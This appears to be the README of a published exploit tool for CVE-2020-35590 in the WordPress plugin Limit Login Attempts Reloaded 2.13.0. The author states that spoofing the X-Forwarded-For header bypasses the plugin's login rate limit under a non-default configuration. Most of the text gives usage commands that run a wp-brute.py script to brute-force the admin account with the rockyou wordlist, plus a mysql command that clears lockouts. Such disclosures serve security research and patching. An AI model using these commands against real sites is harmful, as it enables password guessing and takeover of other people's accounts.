## Exploit Information

**Exploit Title:** WordPress Plugin Limit Login Attempts Reloaded 2.13.0 - Login Limit Bypass  
**CVE:** [CVE-2020-35590](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35590)  
**Date:** 2020-06-09  
**Exploit Author:** N4nj0  
**Software Link:** [https://wordpress.org/plugins/limit-login-attempts-reloaded/](https://wordpress.org/plugins/limit-login-attempts-reloaded/)  
**Version:** 2.13.0  
**Tested on:** WordPress 5.4.1, 5.4.2  
**Vulnerability Advisory:** [https://n4nj0.github.io/advisories/wordpress-plugin-limit-login-attempts-reloaded/](https://n4nj0.github.io/advisories/wordpress-plugin-limit-login-attempts-reloaded/)  

The affected WordPress plugin is aimed to be a bruteforce attack protection mechanism, and is currently installed in more than **1 million** of active installations.  
I've found a rate limiting bypass under a non-default configuration, which effectively defeats the plugin purpose.  

## Usage

### Check

`./wp-brute.py -c -u http://wordpress -H X-Forwarded-For -l admin -P /usr/share/wordlists/rockyou.txt`  
`./wp-brute.py --check --url http://wordpress --header X-Forwarded-For --login admin --passwordlist /usr/share/wordlists/rockyou.txt --quiet`  

### Exploit
`./wp-brute.py -e -u http://wordpress -H X-Forwarded-For -l admin -P /usr/share/wordlists/rockyou.txt -q`  
`./wp-brute.py --exploit --url http://wordpress --header X-Forwarded-For --login admin --passwordlist /usr/share/wordlists/rockyou.txt --quiet`  

### Manually unlock user
`mysql -uroot -ppassword wordpress -e "UPDATE wp_options SET option_value = '' WHERE option_name = 'limit_login_lockouts' LIMIT 1;"`  
